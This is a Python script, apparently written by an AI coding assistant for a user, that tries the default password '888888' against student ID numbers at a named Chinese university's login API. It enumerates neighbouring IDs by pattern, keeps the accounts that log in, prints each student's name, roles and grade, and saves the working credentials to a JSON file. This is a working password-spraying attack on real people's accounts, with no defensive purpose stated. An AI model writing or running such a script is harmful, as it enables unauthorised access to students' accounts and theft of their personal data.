#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
哈尔滨信息工程学院真实School API账号测试程序
"""

import requests
import json
import time

class SchoolAPITester:
    def __init__(self):
        self.base_url = "https://work.greathiit.com/api/user/loginWai"
        self.headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        self.valid_accounts = []
        self.invalid_accounts = []
        
    def test_login(self, user_number, password="888888"):
        """测试单个账号登录"""
        payload = {
            "userNumber": user_number,
            "password": password,
            "autoLogin": True,
            "provider": "account"
        }
        
        try:
            print(f"测试账号: {user_number} / {password}")
            response = requests.post(self.base_url, 
                                   json=payload, 
                                   headers=self.headers, 
                                   timeout=10)
            
            result = {
                "userNumber": user_number,
                "password": password,
                "status_code": response.status_code,
                "success": False,
                "data": None,
                "error": None
            }
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    result["data"] = data
                    
                    # 判断登录是否成功
                    if data.get("success") == True or data.get("code") == 200:
                        result["success"] = True
                        print(f"SUCCESS: {user_number}")
                        self.valid_accounts.append(result)
                        # 打印用户信息
                        if "data" in data and data["data"]:
                            user_info = data["data"]
                            name = user_info.get("name", "Unknown")
                            roles = user_info.get("roleNames", [])
                            print(f"  Name: {name}")
                            print(f"  Roles: {roles}")
                    else:
                        result["error"] = data.get("message", "Login failed")
                        print(f"FAILED: {user_number} - {result['error']}")
                        self.invalid_accounts.append(result)
                        
                except json.JSONDecodeError as e:
                    result["error"] = f"JSON error: {str(e)}"
                    print(f"JSON ERROR: {user_number}")
                    self.invalid_accounts.append(result)
            else:
                result["error"] = f"HTTP {response.status_code}"
                print(f"HTTP ERROR: {user_number} - {response.status_code}")
                self.invalid_accounts.append(result)
                
            return result
            
        except requests.RequestException as e:
            result = {
                "userNumber": user_number,
                "password": password,
                "status_code": 0,
                "success": False,
                "data": None,
                "error": f"Network error: {str(e)}"
            }
            print(f"NETWORK ERROR: {user_number}")
            self.invalid_accounts.append(result)
            return result

    def print_summary(self):
        """打印测试总结"""
        print("\n" + "=" * 60)
        print("TEST SUMMARY")
        print("=" * 60)
        
        print(f"Valid accounts: {len(self.valid_accounts)}")
        if self.valid_accounts:
            print("WORKING ACCOUNTS:")
            for account in self.valid_accounts:
                print(f"  Account: {account['userNumber']}")
                print(f"  Password: {account['password']}")
                
                user_data = account["data"]
                if user_data and "data" in user_data:
                    user_info = user_data["data"]
                    name = user_info.get("name", "Unknown")
                    roles = user_info.get("roleNames", [])
                    grade = user_info.get("grade", "Unknown")
                    print(f"  Name: {name}")
                    print(f"  Roles: {roles}")
                    print(f"  Grade: {grade}")
                print()
        
        print(f"Failed accounts: {len(self.invalid_accounts)}")

def main():
    print("=== School API Test Program ===")
    print("Testing student accounts with password 888888")
    print("API: https://work.greathiit.com/api/user/loginWai")
    print()
    
    tester = SchoolAPITester()
    
    # Test known accounts first
    print("Phase 1: Testing known student numbers")
    print("-" * 50)
    
    # Based on the patterns you provided
    sample_accounts = [
        "2024010009",  # 2024 grade known
        "2024010011",  # 2024 grade known
        "2023010109",  # 2023 grade known
        "2023010114",  # 2023 grade known
        "2023010121",  # 2023 grade known
        "2022010606",  # 2022 grade known
        "2022010616",  # 2022 grade known
        "2022010619",  # 2022 grade known
        "2022010620"   # 2022 grade known
    ]
    
    for account in sample_accounts:
        result = tester.test_login(account)
        time.sleep(1)  # Avoid too frequent requests
        
        if result["success"]:
            print(f"Found working account! {account}")
    
    # Test more accounts based on patterns
    if tester.valid_accounts:
        print(f"\nPhase 2: Testing more accounts based on patterns")
        print("-" * 50)
        
        # Additional test accounts based on patterns
        additional_accounts = [
            "2024010010", "2024010012", "2024010013", "2024010014",
            "2023010110", "2023010115", "2023010120", "2023010122",
            "2022010607", "2022010617", "2022010618", "2022010621"
        ]
        
        for account in additional_accounts:
            if len(tester.valid_accounts) >= 5:  # Limit to 5 valid accounts
                break
            result = tester.test_login(account)
            time.sleep(1)
    
    tester.print_summary()
    
    # Save results to file
    if tester.valid_accounts or tester.invalid_accounts:
        filename = f"school_test_results_{int(time.time())}.json"
        filepath = f"D:\\ClaudeCode\\AI_Web\\{filename}"
        
        results = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "valid_accounts": tester.valid_accounts,
            "invalid_accounts": tester.invalid_accounts
        }
        
        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(results, f, ensure_ascii=False, indent=2)
            print(f"Results saved to: {filepath}")
        except Exception as e:
            print(f"Failed to save results: {str(e)}")

if __name__ == "__main__":
    main()